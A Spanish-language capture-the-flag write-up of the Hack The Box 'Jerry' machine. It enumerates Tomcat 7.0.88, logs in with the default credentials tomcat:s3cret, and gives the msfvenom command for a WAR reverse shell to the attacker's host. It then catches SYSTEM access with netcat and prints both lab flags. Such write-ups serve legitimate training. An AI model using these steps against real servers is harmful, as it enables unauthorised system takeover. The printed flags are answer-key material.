---
category: Hack The Box
tags:
  - eJPT
  - eWPT
title: Machine Jerry
comments: "true"
image: /assets/img/machines/Jerry/Jerrybanner.jpeg
---
## Introducción
La máquina Jerry de Hack The Box es una de las más accesibles para quienes están comenzando en el mundo del pentesting. Su enfoque está en la identificación y explotación de configuraciones por defecto en aplicaciones ampliamente utilizadas. Durante este desafío, se identificó un servidor Apache Tomcat expuesto en el puerto 8080, que permitía el acceso al panel de administración mediante credenciales conocidas. A partir de esto, fue posible cargar un archivo .war con una reverse shell, obteniendo acceso al sistema con privilegios NT AUTHORITY\SYSTEM. Este writeup documenta paso a paso cómo se logró comprometer completamente la máquina mediante técnicas simples pero efectivas.

## Skills
- Abusing Tomcat

## Enumeración
Durante la fase de enumeración el escaneo reveló que el servicio expuesto corresponde a Apache Tomcat 7.0.88, ejecutando el motor JSP Apache Tomcat/Coyote en el puerto 8080. 
```bash
❯ nmap -sCV -p 8080 10.10.10.95
Nmap scan report for 10.10.10.95
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
```

Además, la página principal identificada con el título "Apache Tomcat/7.0.88" confirma que se trata de una instalación por defecto. Esta versión específica de Tomcat es conocida por ser vulnerable a ciertas técnicas de subida y ejecución de archivos maliciosos, lo que puede ser clave para comprometer el sistema.
![1](/assets/img/machines/Jerry/1.jpeg)

## Abusing Tomcat
Al acceder al portal web en el puerto 8080, se intentó entrar al panel de administración en la ruta /manager/html, típica de instalaciones por defecto de Apache Tomcat. 
![2](/assets/img/machines/Jerry/2.jpeg)

Inicialmente se probaron credenciales comunes como admin:admin, pero el acceso fue denegado con un error 403 - Access Denied. 
![3](/assets/img/machines/Jerry/3.jpeg)

No obstante, la misma página de error incluía una referencia a las credenciales por defecto tomcat:s3cret, lo cual sugería que podría tratarse de una configuración expuesta o mal asegurada que podía ser aprovechada en la siguiente etapa.
![4](/assets/img/machines/Jerry/4.jpeg)

Se procedió a probar las credenciales tomcat:s3cret en la ruta /manager/html, y esta vez el acceso fue exitoso. Esto permitió ingresar al Tomcat Web Application Manager, una interfaz desde la cual es posible administrar las aplicaciones desplegadas en el servidor, incluyendo la opción de subir y ejecutar archivos .war, lo que representa una puerta de entrada directa para la ejecución remota de comandos en el sistema.
![5](/assets/img/machines/Jerry/5.jpeg)

Con acceso al Tomcat Web Application Manager, se evaluaron las opciones de carga de archivos maliciosos. Para ello, se listaron los payloads disponibles de Metasploit utilizando msfvenom, filtrando específicamente aquellos relacionados con Java, ya que Tomcat permite el despliegue de aplicaciones en formato .war. Entre los resultados, se identificaron varias opciones de reverse shell y Meterpreter, siendo particularmente útiles aquellos que permiten conectarse de vuelta al atacante y ejecutar comandos en el sistema.
```bash
❯ msfvenom -l payloads | grep java
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
    java/meterpreter/bind_tcp                                          Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                                      Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                                     Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                                       Run a meterpreter server in Java. Connect back stager
    java/shell/bind_tcp                                                Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
    java/shell/reverse_tcp                                             Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
    java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shell
```

Una vez elegido el payload adecuado, se generó un archivo .war con una reverse shell utilizando msfvenom. El payload seleccionado fue java/jsp_shell_reverse_tcp, configurado para conectarse de vuelta a la IP del atacante 10.10.16.6 en el puerto 443. El comando utilizado fue:
```bash
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=443 -f war > shell.war
Payload size: 1102 bytes
Final size of war file: 1102 bytes
```

El archivo resultante, shell.war, fue creado correctamente y quedó listo para ser cargado a través del panel de administración de Tomcat.
![6](/assets/img/machines/Jerry/6.jpeg)

Con el archivo shell.war generado, se procedió a cargarlo mediante el Tomcat Manager en la sección de "Deploy". Una vez desplegado exitosamente, la aplicación quedó disponible en la ruta /shell/.
```plaintext
http://10.10.10.95:8080/shell/
```

Antes de acceder a la URL del payload desplegado, se dejó un listener activo en la máquina atacante utilizando Netcat, a la espera de la conexión entrante. Al ingresar a http://10.10.10.95:8080/shell/, se estableció exitosamente la reverse shell, otorgando acceso remoto al sistema. 
```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

Explorando el sistema con la shell obtenida, se accedió al directorio C:\Users\Administrator\Desktop\flags, donde se encontró un archivo llamado 2 for the price of 1.txt. Al visualizar su contenido, se revelaron ambas flags de la máquina: la user flag y la root flag, confirmando así la total explotación del sistema.
```bash
C:\apache-tomcat-7.0.88>cd C:\Users                        
cd C:\Users

C:\Users>dir 
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users

06/18/2018  11:31 PM    <DIR>          .
06/18/2018  11:31 PM    <DIR>          ..
06/18/2018  11:31 PM    <DIR>          Administrator
08/22/2013  06:39 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)   2,420,318,208 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator

06/18/2018  11:31 PM    <DIR>          .
06/18/2018  11:31 PM    <DIR>          ..
06/19/2018  06:43 AM    <DIR>          Contacts
06/19/2018  07:09 AM    <DIR>          Desktop
06/19/2018  06:43 AM    <DIR>          Documents
01/21/2022  09:23 PM    <DIR>          Downloads
06/19/2018  06:43 AM    <DIR>          Favorites
06/19/2018  06:43 AM    <DIR>          Links
06/19/2018  06:43 AM    <DIR>          Music
06/19/2018  06:43 AM    <DIR>          Pictures
06/19/2018  06:43 AM    <DIR>          Saved Games
06/19/2018  06:43 AM    <DIR>          Searches
06/19/2018  06:43 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   2,420,318,208 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)   2,420,318,208 bytes free

C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,420,318,208 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```